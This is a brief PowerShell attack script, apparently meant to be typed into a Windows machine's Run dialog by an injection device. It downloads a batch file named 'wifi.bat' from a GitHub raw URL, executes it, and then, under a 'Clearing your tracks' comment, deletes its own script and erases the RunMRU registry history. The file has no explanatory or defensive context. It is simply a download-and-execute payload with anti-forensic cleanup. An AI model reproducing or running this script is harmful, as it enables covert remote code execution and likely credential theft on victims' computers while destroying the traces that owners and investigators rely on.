cd /;mkdir x64;cd x64;
wget https://raw.githubusercontent.com/maumakan/tesaja/master/wifi.bat -OutFile wifi.bat
start wifi.bat

 // --> Clearing your tracks

rm a.PS1 -Force

Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue

exit
